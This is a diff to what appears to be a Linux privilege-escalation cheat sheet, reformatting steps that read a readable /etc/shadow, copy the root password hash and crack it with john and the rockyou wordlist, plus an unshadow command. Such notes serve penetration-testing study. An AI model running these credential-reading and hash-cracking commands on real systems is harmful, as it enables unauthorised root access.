@@ -31,11 +31,15 @@ replace the root hash with this new hash and login:
 
 if the /etc/shadow is readable copy the root user hash to the local system:
 
-#### `ls -l /etc/shadow` `head -n 1 /etc/shadow`
+#### `ls -l /etc/shadow`&#x20;
+
+#### `head -n 1 /etc/shadow`
 
 Crack the password hash using john:
 
-#### `john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` `john --format=sha512crypt hash.txt --show`
+#### `john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`&#x20;
+
+#### `john --format=sha512crypt hash.txt --show`
 
 #### `unshadow /etc/passwd /etc/shadow > hash`
 
